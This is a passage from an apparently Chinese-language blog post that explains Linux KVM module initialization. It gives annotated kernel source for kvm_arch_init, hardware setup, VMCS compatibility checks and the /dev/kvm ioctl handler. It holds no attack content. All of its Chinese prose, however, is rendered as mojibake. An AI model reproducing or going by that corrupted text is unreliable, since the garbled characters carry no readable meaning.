kvm_reboot_notifierï¼šç³»ç»Ÿé‡å¯æ—¶é€šçŸ¥ã€‚</td></tr><tr><td>ç¼“å­˜VCPUç»“æ„ä½“</td><td>å°†åˆ›å»ºVCPUæ‰€éœ€çš„cacheèµ‹å€¼ç»™kvm_vcpu_cacheï¼Œç”¨äºå¿«é€Ÿåˆ†é…VCPUç©ºé—´ã€‚</td></tr><tr><td>è®¾ç½®file_operationsçš„owner</td><td>å°†3ä¸ªfile_operationsçš„ownerè®¾ç½®ä¸ºå½“å‰æ¨¡å—ï¼Œåˆ†åˆ«å¯¹åº”ä¸åŒçš„è®¾å¤‡ã€‚</td></tr><tr><td>è°ƒç”¨misc_registeråˆ›å»ºè®¾å¤‡</td><td>åˆ›å»ºåä¸ºkvm_devçš„miscè®¾å¤‡ï¼Œå°†å…¶file_operationsè®¾ç½®ä¸ºkvm_chardev_opsã€‚</td></tr><tr><td>è®¾ç½®kvm_preempt_ops</td><td>è®¾ç½®kvm_preempt_opsçš„sched_inå’Œsched_outï¼Œç”¨äºè™šæ‹ŸæœºVCPUæ‰€åœ¨çº¿ç¨‹è¢«æŠ¢å æˆ–è°ƒåº¦æ—¶çš„å¤„ç†ã€‚</td></tr></tbody></table><p>kvm_arch_initä½œä¸ºé€šç”¨ä»£ç ä¸€èˆ¬éƒ½ä¼šè°ƒç”¨kvm_arch_xxxè¿™ç§ä¸æ¶æ„ç›¸å…³çš„ä»£ç ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°å®šä¹‰åœ¨arch/x86/kvmç›®å½•çš„x86.cä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kvm_arch_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *opaque)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> r;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_x86_ops</span> *<span class="hljs-title">ops</span> =</span> opaque;<br><br><span class="hljs-keyword">if</span> (kvm_x86_ops) &#123;<br>printk(KERN_ERR <span class="hljs-string">&quot;kvm: already loaded the other module\n&quot;</span>);<br>r = -EEXIST;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!ops-&gt;cpu_has_kvm_support()) &#123;<br>printk(KERN_ERR <span class="hljs-string">&quot;kvm: no hardware support\n&quot;</span>);<br>r = -EOPNOTSUPP;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><span class="hljs-keyword">if</span> (ops-&gt;disabled_by_bios()) &#123;<br>printk(KERN_ERR <span class="hljs-string">&quot;kvm: disabled by bios\n&quot;</span>);<br>r = -EOPNOTSUPP;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br>r = -ENOMEM;<br>shared_msrs = alloc_percpu(struct kvm_shared_msrs);<br><span class="hljs-keyword">if</span> (!shared_msrs) &#123;<br>printk(KERN_ERR <span class="hljs-string">&quot;kvm: failed to allocate percpu kvm_shared_msrs\n&quot;</span>);<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br>r = kvm_mmu_module_init();<br><span class="hljs-keyword">if</span> (r)<br><span class="hljs-keyword">goto</span> out_free_percpu;<br><br>kvm_set_mmio_spte_mask();<br><br>kvm_x86_ops = ops;<br><br>kvm_mmu_set_mask_ptes(PT_USER_MASK, PT_ACCESSED_MASK,<br>PT_DIRTY_MASK, PT64_NX_MASK, <span class="hljs-number">0</span>);<br><br>kvm_timer_init();<br><br>perf_register_guest_info_callbacks(&amp;kvm_guest_cbs);<br><br><span class="hljs-keyword">if</span> (cpu_has_xsave)<br>host_xcr0 = xgetbv(XCR_XFEATURE_ENABLED_MASK);<br><br>kvm_lapic_init();<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_X86_64</span><br>pvclock_gtod_register_notifier(&amp;pvclock_gtod_notifier);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>out_free_percpu:<br>free_percpu(shared_msrs);<br>out:<br><span class="hljs-keyword">return</span> r;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>é¦–å…ˆï¼Œå‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•°<code>opaque</code>ï¼Œå…¶ä¸­å­˜å‚¨äº†KVMå®ç°çš„ç»“æ„ä½“ï¼ˆä¾‹å¦‚ï¼Œ<code>vmx_x86_ops</code>ï¼‰ï¼Œè¿™äº›ç»“æ„ä½“åŒ…å«äº†å®ç°çš„å›è°ƒå‡½æ•°ç­‰ä¿¡æ¯ã€‚</li><li>ä»£ç å¼€å§‹æ‰§è¡Œæ£€æŸ¥ï¼Œç¡®ä¿åªæœ‰ä¸€ä¸ªKVMå®ç°èƒ½å¤ŸåŠ è½½åˆ°å†…æ ¸ã€‚å¦‚æœ<code>kvm_x86_ops</code>å·²ç»å­˜åœ¨ï¼Œè¡¨ç¤ºå·²åŠ è½½å…¶ä»–æ¨¡å—ï¼Œåˆ™æ‰“å°é”™è¯¯å¹¶è¿”å›ã€‚</li><li>æ¥ç€ï¼Œé€šè¿‡è°ƒç”¨<code>ops-&gt;cpu_has_kvm_support()</code>å‡½æ•°æ£€æµ‹CPUæ˜¯å¦æ”¯æŒVMXæ¨¡å¼ï¼ˆå¯¹åº”å¼€å¯æ¡ä»¶1ï¼‰ã€‚å¦‚æœä¸æ”¯æŒï¼Œåˆ™æ‰“å°é”™è¯¯å¹¶è¿”å›ã€‚</li><li>ç„¶åï¼Œé€šè¿‡è°ƒç”¨<code>ops-&gt;disabled_by_bios()</code>å‡½æ•°æ£€æµ‹æ˜¯å¦è¢«BIOSå…³é—­ï¼ˆå¯¹åº”å¼€å¯æ¡ä»¶7ï¼‰ã€‚å¦‚æœè¢«å…³é—­ï¼Œåˆ™æ‰“å°é”™è¯¯å¹¶è¿”å›ã€‚</li><li>å¦‚æœé€šè¿‡ä¸Šè¿°æ£€æŸ¥ï¼Œé¦–å…ˆåˆ†é…ä¸€ä¸ªpercpuå˜é‡<code>shared_msrs</code>ï¼Œç”¨äºå­˜å‚¨å…±äº«çš„MSRå¯„å­˜å™¨æ•°æ®ã€‚</li><li>è°ƒç”¨<code>kvm_mmu_module_init()</code>å‡½æ•°åˆå§‹åŒ–å†…å­˜è™šæ‹ŸåŒ–å·¥ä½œã€‚</li><li>è°ƒç”¨<code>kvm_set_mmio_spte_mask()</code>å‡½æ•°è®¾ç½®MMIOå†…å­˜çš„æ ‡è¯†ç¬¦ã€‚</li><li>å°†ä¼ é€’è¿›æ¥çš„KVMå®ç°çš„ç»“æ„ä½“èµ‹å€¼ç»™å…¨å±€å˜é‡<code>kvm_x86_ops</code>ã€‚</li><li>æ‰§è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œå¦‚è®¾ç½®é¡µè¡¨é¡¹çš„æ©ç ã€åˆå§‹åŒ–è®¡æ—¶å™¨ç­‰ã€‚</li><li>æ³¨å†Œæ€§èƒ½å›è°ƒå‡½æ•°ï¼Œä»¥ä¾¿åœ¨æ€§èƒ½åˆ†æä¸­è·å–å®¢æˆ·æœºä¿¡æ¯ã€‚</li><li>å¦‚æœCPUæ”¯æŒXSAVEæŒ‡ä»¤é›†ï¼Œè·å–ä¸»æœºçš„XCR0å€¼ã€‚</li><li>æœ€åï¼Œæ‰§è¡ŒLAPICï¼ˆLocal Advanced Programmable Interrupt Controllerï¼‰çš„åˆå§‹åŒ–ï¼Œæ³¨å†Œä¸€ä¸ªpvclock_gtod_notifieré€šçŸ¥ã€‚</li></ul><p>kvm_arch_hardware_setupï¼ŒåŒæ ·ï¼Œå…¶ä¸»è¦è°ƒç”¨äº†å®ç°ç›¸å…³çš„vmx_x86_opsçš„hardware_setupæˆå‘˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// kvm_arch_hardware_setup å‡½æ•°æ˜¯KVMåœ¨ç¡¬ä»¶åˆå§‹åŒ–é˜¶æ®µçš„æ¶æ„ç‰¹å®šéƒ¨åˆ†ã€‚</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kvm_arch_hardware_setup</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> r;<br><br>    <span class="hljs-comment">// è°ƒç”¨Intelè™šæ‹ŸåŒ–å®ç°çš„ hardware_setup å‡½æ•°è¿›è¡Œç¡¬ä»¶åˆå§‹åŒ–æ“ä½œã€‚</span><br>    r = kvm_x86_ops-&gt;hardware_setup();<br>    <span class="hljs-keyword">if</span> (r != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> r;<br><br>    <span class="hljs-comment">// å¦‚æœæ”¯æŒTSCæ§åˆ¶ï¼Œè¿›è¡ŒTSCç›¸å…³çš„é…ç½®ã€‚</span><br>    <span class="hljs-keyword">if</span> (kvm_has_tsc_control) &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * ç¡®ä¿ç”¨æˆ·åªèƒ½é…ç½®é€‚åˆäºæœ‰ç¬¦å·æ•´æ•°çš„ tsc_khz å€¼ã€‚</span><br><span class="hljs-comment">         * æœ€å°å€¼ä¸éœ€è¦è®¡ç®—ï¼Œå› ä¸ºå¯¹äºæ‰€æœ‰æœºå™¨ï¼Œå®ƒå°†å§‹ç»ˆä¸º 1ã€‚</span><br><span class="hljs-comment">         */</span><br>        u64 max = min(<span class="hljs-number">0x7fffffff</span>ULL,<br>                      __scale_tsc(kvm_max_tsc_scaling_ratio, tsc_khz));<br>        <br>        <span class="hljs-comment">// å°†è®¡ç®—å¾—åˆ°çš„æœ€å¤§å€¼å­˜å‚¨åœ¨ kvm_max_guest_tsc_khz å˜é‡ä¸­ã€‚</span><br>        kvm_max_guest_tsc_khz = max;<br><br>        <span class="hljs-comment">// è®¡ç®—å¹¶è®¾ç½®é»˜è®¤çš„ TSC ç¼©æ”¾æ¯”ä¾‹ã€‚</span><br>        kvm_default_tsc_scaling_ratio = <span class="hljs-number">1ULL</span> &lt;&lt; kvm_tsc_scaling_ratio_frac_bits;<br>    &#125;<br><br>    <span class="hljs-comment">// åˆå§‹åŒ– MSR åˆ—è¡¨ï¼Œç”¨äºå¤„ç†ç‰¹å®šçš„æ¨¡å‹ç›¸å…³å¯„å­˜å™¨ã€‚</span><br>    kvm_init_msr_list();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li>è¯¥å‡½æ•°é¦–å…ˆè°ƒç”¨äº†æ¶æ„ç‰¹å®šçš„ <code>hardware_setup</code> å‡½æ•°ï¼Œè¿›è¡Œç¡¬ä»¶åˆå§‹åŒ–æ“ä½œï¼Œä»¥ç¡®ä¿è™šæ‹ŸåŒ–çš„ç›¸å…³ç¡¬ä»¶æ”¯æŒå¾—ä»¥æ­£ç¡®é…ç½®ã€‚</li><li>å¦‚æœæ”¯æŒ TSC æ§åˆ¶ï¼Œä»£ç ä¼šå¯¹ TSC è¿›è¡Œç›¸å…³é…ç½®ï¼Œè®¡ç®—å¹¶è®¾ç½®åˆé€‚çš„ TSC ç¼©æ”¾æ¯”ä¾‹ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ç›¸å…³å˜é‡ä¸­ã€‚</li><li>æœ€åï¼Œå‡½æ•°è¿›è¡Œ MSR åˆ—è¡¨çš„åˆå§‹åŒ–ï¼Œè¿™äº› MSR ç”¨äºå¤„ç†ç‰¹å®šçš„æ¨¡å‹ç›¸å…³å¯„å­˜å™¨ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> __init <span class="hljs-title">vmx_check_processor_compat</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *rtn)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vmcs_config</span> <span class="hljs-title">vmcs_conf</span>;</span><br><br>    *(<span class="hljs-keyword">int</span> *)rtn = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// è®¾ç½®å¹¶è·å–å½“å‰CPUçš„ VMCS é…ç½®</span><br>    <span class="hljs-keyword">if</span> (setup_vmcs_config(&amp;vmcs_conf) &lt; <span class="hljs-number">0</span>)<br>        *(<span class="hljs-keyword">int</span> *)rtn = -EIO;<br>    <br>    <span class="hljs-comment">// æ£€æŸ¥å½“å‰CPUçš„ VMCS é…ç½®æ˜¯å¦ä¸é¢„æœŸçš„é…ç½®ç›¸ç¬¦</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(&amp;vmcs_config, &amp;vmcs_conf, <span class="hljs-keyword">sizeof</span>(struct vmcs_config)) != <span class="hljs-number">0</span>) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;kvm: CPU %d feature inconsistency!\n&quot;</span>,<br>               smp_processor_id());<br>        *(<span class="hljs-keyword">int</span> *)rtn = -EIO;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><code>vmx_check_processor_compat</code> æ˜¯ä¸€ä¸ªåˆå§‹åŒ–å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥å½“å‰CPUçš„è™šæ‹ŸåŒ–å…¼å®¹æ€§ã€‚</li><li><code>*(int *)rtn = 0;</code> åˆå§‹åŒ–è¿”å›å€¼ä¸º0ï¼Œè¡¨ç¤ºå…¼å®¹æ€§æ£€æŸ¥é€šè¿‡ã€‚</li><li><code>setup_vmcs_config(&amp;vmcs_conf)</code> è°ƒç”¨ <code>setup_vmcs_config</code> å‡½æ•°ï¼Œè·å–å½“å‰CPUçš„ VMCS é…ç½®ä¿¡æ¯ï¼Œå­˜å‚¨åœ¨ <code>vmcs_conf</code> ç»“æ„ä¸­ã€‚</li><li>å¦‚æœè·å–é…ç½®å¤±è´¥ï¼Œåˆ™è®¾ç½®è¿”å›å€¼ä¸º <code>-EIO</code>ï¼Œè¡¨ç¤ºI/Oé”™è¯¯ã€‚</li><li><code>memcmp(&amp;vmcs_config, &amp;vmcs_conf, sizeof(struct vmcs_config)) != 0</code> å¯¹æ¯”å½“å‰CPUçš„ VMCS é…ç½®ä¸é¢„æœŸçš„é…ç½®æ˜¯å¦ä¸€è‡´ã€‚</li><li>å¦‚æœé…ç½®ä¸ä¸€è‡´ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œå¹¶è®¾ç½®è¿”å›å€¼ä¸º <code>-EIO</code>ï¼Œè¡¨ç¤ºå…¼å®¹æ€§æ£€æŸ¥å¤±è´¥ã€‚</li><li>åœ¨hardware_setupå‡½æ•°ä¸­è°ƒç”¨setup_vmcs_configè¿™ä¸€æ­¥éª¤çš„ç›®çš„æ˜¯ç¡®ä¿åœ¨ä¸åŒçš„ç‰©ç†CPUä¸Šï¼Œä½¿ç”¨ç›¸åŒçš„è™šæ‹Ÿæœºé…ç½®ï¼ˆ<code>vmcs_config</code>ï¼‰ï¼Œä»¥ç¡®ä¿ VCPIU åœ¨ä¸åŒç‰©ç† CPU ä¸Šè°ƒåº¦æ—¶çš„ä¸€è‡´æ€§å’Œç¨³å®šæ€§ã€‚å› ä¸ºä¸åŒçš„ç¡¬ä»¶ç‰¹æ€§å¯èƒ½ä¼šå¯¼è‡´ä¸åŒçš„è™šæ‹ŸåŒ–è¡Œä¸ºï¼Œè€Œé€šè¿‡æ¯”è¾ƒå¹¶ä¿æŒä¸€è‡´çš„ VMCS é…ç½®ï¼Œå¯ä»¥å°½é‡å‡å°‘åœ¨ä¸åŒç¡¬ä»¶é—´å‡ºç°é—®é¢˜çš„å¯èƒ½æ€§ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">kvm_chardev_ops</span> =</span> &#123;<br>.unlocked_ioctl = kvm_dev_ioctl,<br>.compat_ioctl   = kvm_dev_ioctl,<br>.llseek= noop_llseek,<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">miscdevice</span> <span class="hljs-title">kvm_dev</span> =</span> &#123;<br>KVM_MINOR,<br><span class="hljs-string">&quot;kvm&quot;</span>,<br>&amp;kvm_chardev_ops,<br>&#125;;<br><br><br></code></pre></td></tr></table></figure><p>kvm_initçš„æœ€åä¸€ä¸ªé‡è¦å·¥ä½œæ˜¯åˆ›å»ºä¸€ä¸ªmiscè®¾å¤‡â€œ/dev/kvmâ€</p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¯¥è®¾å¤‡åªæ”¯æŒioctlç³»ç»Ÿè°ƒç”¨ï¼Œå½“ç„¶ï¼Œopenå’Œcloseè¿™äº›ç³»ç»Ÿè°ƒç”¨ä¼šè¢«miscè®¾å¤‡æ¡†æ¶å¤„ç†ã€‚kvm_dev_ioctlä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">kvm_dev_ioctl</span><span class="hljs-params">(struct file *filp,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ioctl, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">long</span> r = -EINVAL;<br><br><span class="hljs-keyword">switch</span> (ioctl) &#123;<br><span class="hljs-keyword">case</span> KVM_GET_API_VERSION:<br><span class="hljs-keyword">if</span> (arg)<br><span class="hljs-keyword">goto</span> out;<br>r = KVM_API_VERSION;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> KVM_CREATE_VM:<br>r = kvm_dev_ioctl_create_vm(arg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> KVM_CHECK_EXTENSION:<br>r = kvm_vm_ioctl_check_extension_generic(<span class="hljs-literal">NULL</span>, arg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> KVM_GET_VCPU_MMAP_SIZE:<br><span class="hljs-keyword">if</span> (arg)<br><span class="hljs-keyword">goto</span> out;<br>r = PAGE_SIZE;     <span class="hljs-comment">/* struct kvm_run */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_X86</span><br>r += PAGE_SIZE;    <span class="hljs-comment">/* pio data page */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_COALESCED_MMIO_PAGE_OFFSET</span><br>r += PAGE_SIZE;    <span class="hljs-comment">/* coalesced mmio ring page */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> KVM_TRACE_ENABLE:<br><span class="hljs-keyword">case</span> KVM_TRACE_PAUSE:<br><span class="hljs-keyword">case</span> KVM_TRACE_DISABLE:<br>r = -EOPNOTSUPP;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> kvm_arch_dev_ioctl(filp, ioctl, arg);<br>&#125;<br>out:<br><span class="hljs-keyword">return</span> r;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>kvm_dev_ioctl</code> å‡½æ•°æ˜¯ç”¨äºå¤„ç† <code>/dev/kvm</code> è®¾å¤‡çš„ ioctl è¯·æ±‚çš„ä¸»è¦å‡½æ•°ã€‚</li><li>æ ¹æ®ä¸åŒçš„ ioctl è¯·æ±‚ï¼Œå‡½æ•°æ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚</li><li>å¯¹äºé€šç”¨æ¥å£ï¼Œæ¯”å¦‚ <code>KVM_GET_API_VERSION</code>ã€<code>KVM_CREATE_VM</code> å’Œ <code>KVM_CHECK_EXTENSION</code>ï¼Œæ‰§è¡Œç›¸åº”çš„å¤„ç†ï¼Œå¹¶è¿”å›ç›¸åº”çš„ç»“æœã€‚</li><li>å¯¹äºæ¶æ„ç›¸å…³çš„æ¥å£ï¼Œè°ƒç”¨ <code>kvm_arch_dev_ioctl</code> å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œè¯¥å‡½æ•°ä¼šæ ¹æ®æ¶æ„ä¸åŒï¼Œè¿›ä¸€æ­¥å¤„ç† ioctl è¯·æ±‚ã€‚</li><li>å¯¹äºå…¶ä»–ä¸€äº› ioctl è¯·æ±‚ï¼Œå¦‚ <code>KVM_GET_VCPU_MMAP_SIZE</code>ï¼Œè®¡ç®—å¹¶è¿”å›ä¸è™šæ‹Ÿæœºè¿è¡Œæœ‰å…³çš„å†…å­˜å¤§å°ã€‚</li><li>å¦‚æœæ˜¯ä¸æ”¯æŒçš„æ“ä½œï¼Œè¿”å›é”™è¯¯ç  -EOPNOTSUPPã€‚</li><li>å¤„ç†äº† KVM è®¾å¤‡çš„ ioctl è¯·æ±‚ï¼Œæ ¹æ®ä¸åŒçš„è¯·æ±‚ç±»å‹ï¼Œæ‰§è¡Œç›¸åº”çš„æ“ä½œ</li></ul><p><strong>æ€»ç»“ä¸€ä¸‹kvmæ¨¡å—åˆå§‹åŒ–åˆ°åº•åšäº†ä»€ä¹ˆï¼š</strong></p><ol><li><strong>ç¡¬ä»¶æ£€æŸ¥ï¼š</strong> åˆå§‹åŒ–è¿‡ç¨‹é¦–å…ˆä¼šè¿›è¡Œç¡¬ä»¶æ£€æŸ¥ï¼Œç¡®ä¿ä¸»æœºçš„ç¡¬ä»¶æ”¯æŒè™šæ‹ŸåŒ–æ‰©å±•ï¼Œå¦‚ Intel VT-x æˆ– AMD-Vã€‚è¿™äº›ç¡¬ä»¶æ‰©å±•å…è®¸è™šæ‹Ÿæœºåœ¨æ›´åŠ éš”ç¦»çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œæé«˜æ€§èƒ½å’Œå®‰å…¨æ€§ã€‚</li><li><strong>åˆ†é…ç»“æ„ç¼“å­˜ï¼š</strong> KVM åˆå§‹åŒ–è¿‡ç¨‹åˆ†é…äº†ä¸€äº›å¸¸ç”¨çš„æ•°æ®ç»“æ„çš„ç¼“å­˜ï¼Œè¿™äº›ç»“æ„å°†ç”¨äºç®¡ç†è™šæ‹Ÿæœºå’Œè™šæ‹Ÿ CPU çš„çŠ¶æ€ã€‚</li><li><strong>åˆ›å»ºè®¾å¤‡èŠ‚ç‚¹ï¼š</strong> é€šè¿‡åˆ›å»º <code>/dev/kvm</code> è®¾å¤‡èŠ‚ç‚¹ï¼Œç”¨æˆ·ç©ºé—´ç¨‹åºå¯ä»¥é€šè¿‡è¿™ä¸ªè®¾å¤‡ä¸ KVM å†…æ ¸æ¨¡å—è¿›è¡Œé€šä¿¡ï¼Œå‘èµ·è™šæ‹ŸåŒ–è¯·æ±‚å’Œæ“ä½œã€‚</li><li><strong>è·å– VMCS é…ç½®ï¼š</strong> åœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­ï¼ŒKVM æ¨¡å—ä¼šè·å– VMCSï¼ˆVirtual Machine Control Structureï¼‰çš„é…ç½®ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ç”¨äºåˆå§‹åŒ– VMCS ç»“æ„ã€‚VMCS æ˜¯ä¸€ä¸ªå…³é”®çš„æ•°æ®ç»“æ„ï¼Œç”¨äºæ§åˆ¶è™šæ‹Ÿæœºè¿è¡Œçš„å„ä¸ªæ–¹é¢ã€‚</li><li><strong>è®¾ç½®å…¨å±€å˜é‡ï¼š</strong> æ ¹æ®ä¸»æœº CPU çš„ç‰¹æ€§å’Œæ”¯æŒï¼ŒKVM æ¨¡å—ä¼šè®¾ç½®ä¸€äº›å…¨å±€å˜é‡ï¼Œä»¥é€‚åº”ä¸åŒçš„ç¡¬ä»¶ç¯å¢ƒã€‚ä¾‹å¦‚ï¼Œæ ¹æ® CPU æ˜¯å¦æ”¯æŒ EPTï¼ˆExtended Page Tablesï¼‰ç­‰ç‰¹æ€§ï¼Œè®¾ç½®ç›¸åº”çš„å…¨å±€æ ‡å¿—ã€‚</li><li><strong>ä¸ºæ¯ä¸ªç‰©ç† CPU åˆ†é… VMCSï¼š</strong> KVM åˆå§‹åŒ–è¿‡ç¨‹ä¼šä¸ºæ¯ä¸ªç‰©ç† CPU åˆ†é…ä¸€ä¸ª VMCS ç»“æ„ï¼Œå¹¶å°†è¿™äº›ç»“æ„ä¿å­˜åœ¨ percpu å˜é‡ä¸­ã€‚è¿™ä¸ºè™šæ‹Ÿæœºåœ¨ä¸åŒçš„ç‰©ç† CPU ä¸Šåˆ‡æ¢å’Œè°ƒåº¦æä¾›äº†æ”¯æŒã€‚</li><li><strong>è¿›å…¥ VMX æ¨¡å¼ï¼š</strong> åœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­ï¼Œå¹¶æ²¡æœ‰å°† CPU è®¾ç½®ä¸º VMX æ¨¡å¼ã€‚VMX æ¨¡å¼æ˜¯è™šæ‹Ÿæœºæ‰©å±•çš„ä¸€ç§ç¡¬ä»¶è™šæ‹ŸåŒ–æ¨¡å¼ï¼Œéœ€è¦é€šè¿‡è®¾ç½® CR4 å¯„å­˜å™¨çš„ VMXE ä½å¹¶åˆ†é… VMXON 